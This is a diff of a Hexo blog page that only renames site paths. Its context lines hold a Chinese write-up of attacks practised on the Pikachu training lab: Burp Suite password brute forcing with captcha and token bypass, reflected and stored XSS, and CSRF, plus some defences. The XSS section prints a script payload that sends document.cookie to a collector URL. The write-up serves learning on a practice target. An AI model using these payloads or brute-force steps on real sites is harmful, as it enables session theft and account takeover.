@@ -7,8 +7,8 @@
 
 <head>
   <meta charset="UTF-8">
-  <link rel="apple-touch-icon" sizes="76x76" href="/SinkyQ/sinkyhexo.github.io.git/img/fluid.png">
-  <link rel="icon" href="/SinkyQ/sinkyhexo.github.io.git/img/fluid.png">
+  <link rel="apple-touch-icon" sizes="76x76" href="/SinkyQ/SinkyQ.github.io.git/img/fluid.png">
+  <link rel="icon" href="/SinkyQ/SinkyQ.github.io.git/img/fluid.png">
   <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
   <meta http-equiv="x-ua-compatible" content="ie=edge">
   
@@ -19,7 +19,7 @@
     <meta name="description" content="0x01 暴力破解基于表单的暴力破解开启bp抓包，对username,password字段的字典做爆破，得到admin&#x2F;123456. 验证码绕过(on server)随意输入账户密码，bp抓包，发送到重发器，修改密码后重新发送，发现未报错验证码错误，证明验证码没有进行时效性验证，可重复提交使用。 将流量包发送到测试器，对用户名和密码进行字典爆破，登录成功。 验证码绕过(on client)同上步">
 <meta property="og:type" content="article">
 <meta property="og:title" content="pikachu漏洞练习记录1">
-<meta property="og:url" content="https://github.com/SinkyQ/sinkyhexo.github.io.git/2022/08/09/pikachu%E6%BC%8F%E6%B4%9E%E7%BB%83%E4%B9%A01/index.html">
+<meta property="og:url" content="https://github.com/SinkyQ/SinkyQ.github.io.git/2022/08/09/pikachu%E6%BC%8F%E6%B4%9E%E7%BB%83%E4%B9%A01/index.html">
 <meta property="og:site_name" content="Sinky&#39;s Blog">
 <meta property="og:description" content="0x01 暴力破解基于表单的暴力破解开启bp抓包，对username,password字段的字典做爆破，得到admin&#x2F;123456. 验证码绕过(on server)随意输入账户密码，bp抓包，发送到重发器，修改密码后重新发送，发现未报错验证码错误，证明验证码没有进行时效性验证，可重复提交使用。 将流量包发送到测试器，对用户名和密码进行字典爆破，登录成功。 验证码绕过(on client)同上步">
 <meta property="og:locale" content="en_US">
@@ -72,12 +72,12 @@
 <link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
 
 
-<link  rel="stylesheet" href="/SinkyQ/sinkyhexo.github.io.git/css/main.css" />
+<link  rel="stylesheet" href="/SinkyQ/SinkyQ.github.io.git/css/main.css" />
 
 
-  <link id="highlight-css" rel="stylesheet" href="/SinkyQ/sinkyhexo.github.io.git/css/highlight.css" />
+  <link id="highlight-css" rel="stylesheet" href="/SinkyQ/SinkyQ.github.io.git/css/highlight.css" />
   
-    <link id="highlight-css-dark" rel="stylesheet" href="/SinkyQ/sinkyhexo.github.io.git/css/highlight-dark.css" />
+    <link id="highlight-css-dark" rel="stylesheet" href="/SinkyQ/SinkyQ.github.io.git/css/highlight-dark.css" />
   
 
 
@@ -86,22 +86,22 @@
   <script id="fluid-configs">
     var Fluid = window.Fluid || {};
     Fluid.ctx = Object.assign({}, Fluid.ctx)
-    var CONFIG = {"hostname":"github.com","root":"/SinkyQ/sinkyhexo.github.io.git/","version":"1.9.2","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/SinkyQ/sinkyhexo.github.io.git/local-search.xml"};
+    var CONFIG = {"hostname":"github.com","root":"/SinkyQ/SinkyQ.github.io.git/","version":"1.9.2","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/SinkyQ/SinkyQ.github.io.git/local-search.xml"};
 
     if (CONFIG.web_analytics.follow_dnt) {
       var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
       Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
     }
   </script>
-  <script  src="/SinkyQ/sinkyhexo.github.io.git/js/utils.js" ></script>
-  <script  src="/SinkyQ/sinkyhexo.github.io.git/js/color-schema.js" ></script>
+  <script  src="/SinkyQ/SinkyQ.github.io.git/js/utils.js" ></script>
+  <script  src="/SinkyQ/SinkyQ.github.io.git/js/color-schema.js" ></script>
   
 
 
   
 <meta name="generator" content="Hexo 6.2.0">
 <style>.github-emoji { position: relative; display: inline-block; width: 1.2em; min-height: 1.2em; overflow: hidden; vertical-align: top; color: transparent; }  .github-emoji > span { position: relative; z-index: 10; }  .github-emoji img, .github-emoji .fancybox { margin: 0 !important; padding: 0 !important; border: none !important; outline: none !important; text-decoration: none !important; user-select: none !important; cursor: auto !important; }  .github-emoji img { height: 1.2em !important; width: 1.2em !important; position: absolute !important; left: 50% !important; top: 50% !important; transform: translate(-50%, -50%) !important; user-select: none !important; cursor: auto !important; } .github-emoji-fallback { color: inherit; } .github-emoji-fallback img { opacity: 0 !important; }</style>
-<link rel="alternate" href="/SinkyQ/sinkyhexo.github.io.git/atom.xml" title="Sinky's Blog" type="application/atom+xml">
+<link rel="alternate" href="/SinkyQ/SinkyQ.github.io.git/atom.xml" title="Sinky's Blog" type="application/atom+xml">
 </head>
 
 
@@ -114,7 +114,7 @@
 <div class="header-inner" style="height: 70vh;">
   <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
   <div class="container">
-    <a class="navbar-brand" href="/SinkyQ/sinkyhexo.github.io.git/">
+    <a class="navbar-brand" href="/SinkyQ/SinkyQ.github.io.git/">
       <strong>Sinky</strong>
     </a>
 
@@ -133,7 +133,7 @@
           
           
             <li class="nav-item">
-              <a class="nav-link" href="/SinkyQ/sinkyhexo.github.io.git/">
+              <a class="nav-link" href="/SinkyQ/SinkyQ.github.io.git/">
                 <i class="iconfont icon-home-fill"></i>
                 Home
               </a>
@@ -145,7 +145,7 @@
           
           
             <li class="nav-item">
-              <a class="nav-link" href="/SinkyQ/sinkyhexo.github.io.git/archives/">
+              <a class="nav-link" href="/SinkyQ/SinkyQ.github.io.git/archives/">
                 <i class="iconfont icon-archive-fill"></i>
                 Archives
               </a>
@@ -157,7 +157,7 @@
           
           
             <li class="nav-item">
-              <a class="nav-link" href="/SinkyQ/sinkyhexo.github.io.git/categories/">
+              <a class="nav-link" href="/SinkyQ/SinkyQ.github.io.git/categories/">
                 <i class="iconfont icon-category-fill"></i>
                 Categories
               </a>
@@ -169,7 +169,7 @@
           
           
             <li class="nav-item">
-              <a class="nav-link" href="/SinkyQ/sinkyhexo.github.io.git/tags/">
+              <a class="nav-link" href="/SinkyQ/SinkyQ.github.io.git/tags/">
                 <i class="iconfont icon-tags-fill"></i>
                 Tags
               </a>
@@ -181,7 +181,7 @@
           
           
             <li class="nav-item">
-              <a class="nav-link" href="/SinkyQ/sinkyhexo.github.io.git/about/">
+              <a class="nav-link" href="/SinkyQ/SinkyQ.github.io.git/about/">
                 <i class="iconfont icon-user-fill"></i>
                 About
               </a>
@@ -210,7 +210,7 @@
   
 
 <div id="banner" class="banner" parallax=true
-     style="background: url('/SinkyQ/sinkyhexo.github.io.git/img/default.png') no-repeat center center; background-size: cover;">
+     style="background: url('/SinkyQ/SinkyQ.github.io.git/img/default.png') no-repeat center center; background-size: cover;">
   <div class="full-bg-img">
     <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
       <div class="banner-text text-center fade-in-up">
@@ -298,7 +298,7 @@
 <p>将流量包发送到测试器，对用户名和密码进行字典爆破，登录成功。</p>
 <h2 id="验证码绕过-on-client"><a href="#验证码绕过-on-client" class="headerlink" title="验证码绕过(on client)"></a>验证码绕过(on client)</h2><p>同上步骤bp抓包，对用户密码进行爆破即可。后来查了一下这俩的区别。</p>
 <p>查看源码，输入的验证码在本地验证：</p>
-<p><img src="https://i.loli.net/2020/11/02/L4V56WHMm1JPDhc.png" srcset="/SinkyQ/sinkyhexo.github.io.git/img/loading.gif" lazyload alt="捕获.PNG"></p>
+<p><img src="https://i.loli.net/2020/11/02/L4V56WHMm1JPDhc.png" srcset="/SinkyQ/SinkyQ.github.io.git/img/loading.gif" lazyload alt="捕获.PNG"></p>
 <p>可以在bp上不输入验证码或输入错误验证码都可以爆破。</p>
 <h2 id="token防爆破？"><a href="#token防爆破？" class="headerlink" title="token防爆破？"></a>token防爆破？</h2><blockquote>
 <p>token:token是服务端生成的一串字符串，以作客户端进行请求的一个令牌，当第一次登录后，服务器生成一个token便将此token返回给客户端，以后客户端只需要带着这个token前来请求数据即可。</p>
@@ -313,13 +313,13 @@
 <li>app登录的时候发送加密的用户名和密码到服务器，服务器验证用户名和密码，如果成功，以某种方式比如随机生成32位的字符串作为token，存储到服务器中，并返回token到app</li>
 </ul>
 <p>提交用户密码时页面会提交一个hidden属性的token值，每次提交都会更新，但每次产生的token以明文形式传到前端，我们可以在破解之前获取token值，填到字典中即可进行暴力破解。</p>
-<p><img src="https://i.loli.net/2020/11/02/dlBS7qgfN9cYiIP.png" srcset="/SinkyQ/sinkyhexo.github.io.git/img/loading.gif" lazyload alt="捕获.PNG"></p>
+<p><img src="https://i.loli.net/2020/11/02/dlBS7qgfN9cYiIP.png" srcset="/SinkyQ/SinkyQ.github.io.git/img/loading.gif" lazyload alt="捕获.PNG"></p>
 <p>在测试器中，设置password和token两个变量，使用pitchfork。</p>
 <p>点击<b>选项</b>，更改请求引擎中线程数为1，重定向选择<b>总是</b></p>
 <p><b>Grep-Extract</b>选择<b>添加</b>，中间<b>获得回应包</b><br>，选择token的值复制并选定，点击OK.</p>
-<p><img src="https://i.loli.net/2020/11/02/uLlDMSy46Qp8x2e.png" srcset="/SinkyQ/sinkyhexo.github.io.git/img/loading.gif" lazyload alt="捕获.PNG"></p>
+<p><img src="https://i.loli.net/2020/11/02/uLlDMSy46Qp8x2e.png" srcset="/SinkyQ/SinkyQ.github.io.git/img/loading.gif" lazyload alt="捕获.PNG"></p>
 <p>回到payload,set为1时设置简单清单，使用字典或自己随便输入密码。set为2时设置递归搜索，并如图黏贴token值。</p>
-<p><img src="https://i.loli.net/2020/11/02/gHncFXtKMUB9udA.png" srcset="/SinkyQ/sinkyhexo.github.io.git/img/loading.gif" lazyload alt="捕获.PNG"></p>
+<p><img src="https://i.loli.net/2020/11/02/gHncFXtKMUB9udA.png" srcset="/SinkyQ/SinkyQ.github.io.git/img/loading.gif" lazyload alt="捕获.PNG"></p>
 <p>开始攻击，根据不同length找出正确密码，爆破完成。</p>
 <p>注：该方法着实鸡肋。</p>
 <h1 id="0x02-XSS-跨站脚本"><a href="#0x02-XSS-跨站脚本" class="headerlink" title="0x02 XSS(跨站脚本)"></a>0x02 XSS(跨站脚本)</h1><p>XSS是一种发生在前端浏览器端的漏洞，危害对象也是前端用户，形成XSS漏洞的主要原因是程序对输入输出没有做合适的处理，导致精心构造的字符输出在前端时被浏览器当作有效代码解析执行从而产生危害。</p>
@@ -329,10 +329,10 @@
 <li>输出转义：根据输出点的位置对输出到前端的额呢绒进行适当转义。</li>
 </ul>
 <h2 id="反射性xss-get"><a href="#反射性xss-get" class="headerlink" title="反射性xss(get)"></a>反射性xss(get)</h2><p>随意输入字符串，回显<b>who is xxx,i don’t care</b><br>f12查看，允许输入最大长度为20.</p>
-<p><img src="https://i.loli.net/2020/11/03/vpRrZbsNSgJcqAj.png" srcset="/SinkyQ/sinkyhexo.github.io.git/img/loading.gif" lazyload alt="捕获.PNG"></p>
+<p><img src="https://i.loli.net/2020/11/03/vpRrZbsNSgJcqAj.png" srcset="/SinkyQ/SinkyQ.github.io.git/img/loading.gif" lazyload alt="捕获.PNG"></p>
 <p>更改一下可输入长度，输入一个简单的xss语句：<code>&lt;script&gt;alert("XSS")&lt;/script&gt;</code></p>
 <p>发现可以解析，即存在xss漏洞。</p>
-<p><img src="https://i.loli.net/2020/11/03/hrEMJyIq98Cs2Vm.png" srcset="/SinkyQ/sinkyhexo.github.io.git/img/loading.gif" lazyload alt="捕获.PNG"></p>
+<p><img src="https://i.loli.net/2020/11/03/hrEMJyIq98Cs2Vm.png" srcset="/SinkyQ/SinkyQ.github.io.git/img/loading.gif" lazyload alt="捕获.PNG"></p>
 <p>观察源码可知，它将提交的信息重新发送回来，后台没有对我们提交的信息做任何的漏洞。GET型的xss，一般将带有xss的url伪装后发送给目标即可。</p>
 <p>如果是post型xss，无法直接使用url的方式进行攻击。</p>
 <h3 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h3><p>需要一个接受cookie的服务器（127.0.0.1：80），来接收受害主机的cookie。</p>
@@ -342,22 +342,22 @@
 </ul>
 <p><code>&lt;script&gt;window.open("http://127.0.0.1/getcookie.php?cookie="+document.cookie);&lt;/script&gt;</code></p>
 <p>新弹出窗口成功获取到cookie。但是cookie.txt中并没有存储到cookie值……</p>
-<p><img src="https://i.loli.net/2020/11/04/thZo6fBkLyegRJj.png" srcset="/SinkyQ/sinkyhexo.github.io.git/img/loading.gif" lazyload alt="捕获.PNG"></p>
+<p><img src="https://i.loli.net/2020/11/04/thZo6fBkLyegRJj.png" srcset="/SinkyQ/SinkyQ.github.io.git/img/loading.gif" lazyload alt="捕获.PNG"></p>
 <h2 id="反射型xss-post"><a href="#反射型xss-post" class="headerlink" title="反射型xss(post)"></a>反射型xss(post)</h2><p>post型漏洞一般是使用表单方式进行提交，无法直接使用url进行攻击。</p>
 <p>可以通过html页面方式提交，构造一个自己的post丢到自己的网站上</p>
 <p>随意输入字符提交，发现它并未在url中进行提交，说明我们不能将恶意代码嵌入到url中发送。</p>
-<p><img src="https://i.loli.net/2020/11/04/AOsxdLSJibDw8I6.png" srcset="/SinkyQ/sinkyhexo.github.io.git/img/loading.gif" lazyload alt="捕获.PNG"></p>
-<p><img src="https://i.loli.net/2020/11/04/Tk6q81ICzpZtLdu.png" srcset="/SinkyQ/sinkyhexo.github.io.git/img/loading.gif" lazyload alt="捕获.PNG"></p>
+<p><img src="https://i.loli.net/2020/11/04/AOsxdLSJibDw8I6.png" srcset="/SinkyQ/SinkyQ.github.io.git/img/loading.gif" lazyload alt="捕获.PNG"></p>
+<p><img src="https://i.loli.net/2020/11/04/Tk6q81ICzpZtLdu.png" srcset="/SinkyQ/SinkyQ.github.io.git/img/loading.gif" lazyload alt="捕获.PNG"></p>
 <blockquote>
 <p>http中get和post的基本区别：<br>get方式在客户端通过url提交数据，数据在url中可以看到；<br>Post方式，数据放置在html header内提交，数据在url中看不到。<br>get只能传输比较少的数据，安全性较低，post传输数据较多。</p>
 </blockquote>
 <p>我们可以构造一个带有表单提交的页面，让用户在登录完成后去点击，就可以盗取用户的cookie里。</p>
 <h2 id="存储型xss"><a href="#存储型xss" class="headerlink" title="存储型xss"></a>存储型xss</h2><p>存储型xss下攻击者可以将脚本注入到后台存储起来构成更加持久的危害。<br>存储型xss又称永久型xss。</p>
 <p>1.打开实验，页面是一个留言板，尝试输入1111，发现输入被存储。输入单引号双引号尖括号，发现可以正常输出，说明后台没进行过滤。</p>
-<p><img src="https://i.loli.net/2020/11/04/UcbkOZPM56XoAGw.png" srcset="/SinkyQ/sinkyhexo.github.io.git/img/loading.gif" lazyload alt="捕获.PNG"></p>
+<p><img src="https://i.loli.net/2020/11/04/UcbkOZPM56XoAGw.png" srcset="/SinkyQ/SinkyQ.github.io.git/img/loading.gif" lazyload alt="捕获.PNG"></p>
 <p>2.注入<code>&lt;script&gt;alert("XSS")&lt;/script&gt;</code> 提交后会出现弹窗，每次刷新页面时都会弹出，与反射型xss的区别是：存储型xss已经被存储进后台代码中，所以每次刷新都会弹出XSS弹窗。所以存储型xss危害更大，会长久危害用户。</p>
-<p><img src="https://i.loli.net/2020/11/04/uFGYlo5dkwHahMT.png" srcset="/SinkyQ/sinkyhexo.github.io.git/img/loading.gif" lazyload alt="捕获.PNG"></p>
-<p><img src="https://i.loli.net/2020/11/04/IDX4duGil1fQwS5.png" srcset="/SinkyQ/sinkyhexo.github.io.git/img/loading.gif" lazyload alt="1111.PNG"></p>
+<p><img src="https://i.loli.net/2020/11/04/uFGYlo5dkwHahMT.png" srcset="/SinkyQ/SinkyQ.github.io.git/img/loading.gif" lazyload alt="捕获.PNG"></p>
+<p><img src="https://i.loli.net/2020/11/04/IDX4duGil1fQwS5.png" srcset="/SinkyQ/SinkyQ.github.io.git/img/loading.gif" lazyload alt="1111.PNG"></p>
 <h2 id="DOM型xss"><a href="#DOM型xss" class="headerlink" title="DOM型xss"></a>DOM型xss</h2><p>DOM:一个一个访问html的标准编程接口，DOM是一个前端接口，没有和后端做任何的交互。</p>
 <h1 id="0x03-CSRF"><a href="#0x03-CSRF" class="headerlink" title="0x03 CSRF"></a>0x03 CSRF</h1><p>CSRF 跨站请求伪造，在csrf攻击场景中攻击者会伪造一个请求，欺骗目标用户进行点击，用户一旦点击这个请求，整个攻击就完成了，所以csrf攻击也成为”one click”攻击.</p>
 <h3 id="csrf攻击满足的条件"><a href="#csrf攻击满足的条件" class="headerlink" title="csrf攻击满足的条件"></a>csrf攻击满足的条件</h3><p>1.网站没有对个人的信息修改的请求进行防csrf处理，导致请求容易被伪造</p>
@@ -375,7 +375,7 @@
 </li>
 </ul>
 <h2 id="CSRF-get"><a href="#CSRF-get" class="headerlink" title="CSRF(get)"></a>CSRF(get)</h2><p>登录账号，抓取修改个人信息流量包。</p>
-<p><img src="https://i.loli.net/2020/11/04/oTmNylSJxc9vVGa.png" srcset="/SinkyQ/sinkyhexo.github.io.git/img/loading.gif" lazyload alt="11.PNG"></p>
+<p><img src="https://i.loli.net/2020/11/04/oTmNylSJxc9vVGa.png" srcset="/SinkyQ/SinkyQ.github.io.git/img/loading.gif" lazyload alt="11.PNG"></p>
 <p>发现参数可以直接被修改，未做任何确认机制，可以直接将url伪装成各种html让受害者点击。</p>
 <p>可以构造出CSRF攻击URL(bp抓的修改信息的包直接右键复制网址即可):</p>
 <blockquote>
@@ -385,12 +385,12 @@
 <h2 id="CSRF-post"><a href="#CSRF-post" class="headerlink" title="CSRF(post)"></a>CSRF(post)</h2><p>如果修改信息的请求方式是POST型的，攻击者则不能通过构造恶意url来攻击。类似于xss的post型攻击，攻击者会构造一个自己的攻击站点（服务器）,站点上有一个poat.html，诱使用户点击该地址。当用户点击时，就会自动向存在CSRF的服务器提交POST请求修改个人信息，从而完成攻击。</p>
 <p>步骤同get。但不知为何时灵时不灵。</p>
 <p>正常登录状态：</p>
-<p><img src="https://i.loli.net/2020/11/04/b7PA2OHu319LGlB.png" srcset="/SinkyQ/sinkyhexo.github.io.git/img/loading.gif" lazyload alt="捕获.PNG"></p>
+<p><img src="https://i.loli.net/2020/11/04/b7PA2OHu319LGlB.png" srcset="/SinkyQ/SinkyQ.github.io.git/img/loading.gif" lazyload alt="捕获.PNG"></p>
 <p>点击恶意url后，用户信息直接被修改。</p>
-<p><img src="https://i.loli.net/2020/11/04/ZBbA8GrJfQtFe6U.png" srcset="/SinkyQ/sinkyhexo.github.io.git/img/loading.gif" lazyload alt="捕获.PNG"></p>
+<p><img src="https://i.loli.net/2020/11/04/ZBbA8GrJfQtFe6U.png" srcset="/SinkyQ/SinkyQ.github.io.git/img/loading.gif" lazyload alt="捕获.PNG"></p>
 <h2 id="CSRF-Token"><a href="#CSRF-Token" class="headerlink" title="CSRF(Token)"></a>CSRF(Token)</h2><p>token: 每次请求都增加一个随机码（需要够随机，不容易被伪造），后台每次对这个随机码进行验证，这个随机码就是token。</p>
 <p>如图获取修改信息流量包后发现增加了token，无法利用。</p>
-<p><img src="https://i.loli.net/2020/11/04/4fFa5SkYcCtyZGj.png" srcset="/SinkyQ/sinkyhexo.github.io.git/img/loading.gif" lazyload alt="捕获.PNG"></p>
+<p><img src="https://i.loli.net/2020/11/04/4fFa5SkYcCtyZGj.png" srcset="/SinkyQ/SinkyQ.github.io.git/img/loading.gif" lazyload alt="捕获.PNG"></p>
 <h2 id="防范CSRF措施"><a href="#防范CSRF措施" class="headerlink" title="防范CSRF措施"></a>防范CSRF措施</h2><ul>
 <li>增加token验证：对关键操作增加token参数，token值必须随机，每次都不一样</li>
 <li>安全的会话管理（避免会话被利用）<ul>
@@ -418,7 +418,7 @@
     <div class="post-meta">
       <i class="iconfont icon-tags"></i>
       
-        <a href="/SinkyQ/sinkyhexo.github.io.git/tags/web/">#web</a>
+        <a href="/SinkyQ/SinkyQ.github.io.git/tags/web/">#web</a>
       
     </div>
   
@@ -431,7 +431,7 @@
   <div class="license-box my-3">
     <div class="license-title">
       <div>pikachu漏洞练习记录1</div>
-      <div>https://github.com/SinkyQ/sinkyhexo.github.io.git/2022/08/09/pikachu漏洞练习1/</div>
+      <div>https://github.com/SinkyQ/SinkyQ.github.io.git/2022/08/09/pikachu漏洞练习1/</div>
     </div>
     <div class="license-meta">
       
@@ -473,7 +473,7 @@
                   <article class="post-prev col-6">
                     
                     
-                      <a href="/SinkyQ/sinkyhexo.github.io.git/2022/08/09/Ubuntu%E4%B8%8Bbuildroot%E4%BB%A5%E5%8F%8Aqemu%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/" title="Ubuntu下buildroot以及qemu环境搭建">
+                      <a href="/SinkyQ/SinkyQ.github.io.git/2022/08/09/Ubuntu%E4%B8%8Bbuildroot%E4%BB%A5%E5%8F%8Aqemu%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/" title="Ubuntu下buildroot以及qemu环境搭建">
                         <i class="iconfont icon-arrowleft"></i>
                         <span class="hidden-mobile">Ubuntu下buildroot以及qemu环境搭建</span>
                         <span class="visible-mobile">Previous</span>
@@ -483,7 +483,7 @@
                   <article class="post-next col-6">
                     
                     
-                      <a href="/SinkyQ/sinkyhexo.github.io.git/2022/08/09/JIT%E5%AD%A6%E4%B9%A0/" title="JIT学习">
+                      <a href="/SinkyQ/SinkyQ.github.io.git/2022/08/09/JIT%E5%AD%A6%E4%B9%A0/" title="JIT学习">
                         <span class="hidden-mobile">JIT学习</span>
                         <span class="visible-mobile">Next</span>
                         <i class="iconfont icon-arrowright"></i>
@@ -610,8 +610,8 @@
 
 <script  src="https://lib.baomitu.com/jquery/3.6.0/jquery.min.js" ></script>
 <script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
-<script  src="/SinkyQ/sinkyhexo.github.io.git/js/events.js" ></script>
-<script  src="/SinkyQ/sinkyhexo.github.io.git/js/plugins.js" ></script>
+<script  src="/SinkyQ/SinkyQ.github.io.git/js/events.js" ></script>
+<script  src="/SinkyQ/SinkyQ.github.io.git/js/plugins.js" ></script>
 
 
   <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
@@ -633,7 +633,7 @@
 
 
   
-    <script  src="/SinkyQ/sinkyhexo.github.io.git/js/img-lazyload.js" ></script>
+    <script  src="/SinkyQ/SinkyQ.github.io.git/js/img-lazyload.js" ></script>
   
 
 
@@ -705,7 +705,7 @@
 
   <script>Fluid.plugins.imageCaption();</script>
 
-  <script  src="/SinkyQ/sinkyhexo.github.io.git/js/local-search.js" ></script>
+  <script  src="/SinkyQ/SinkyQ.github.io.git/js/local-search.js" ></script>
 
 
 
@@ -713,7 +713,7 @@
 
 <!-- 主题的启动项，将它保持在最底部 -->
 <!-- the boot of the theme, keep it at the bottom -->
-<script  src="/SinkyQ/sinkyhexo.github.io.git/js/boot.js" ></script>
+<script  src="/SinkyQ/SinkyQ.github.io.git/js/boot.js" ></script>
 
 
   
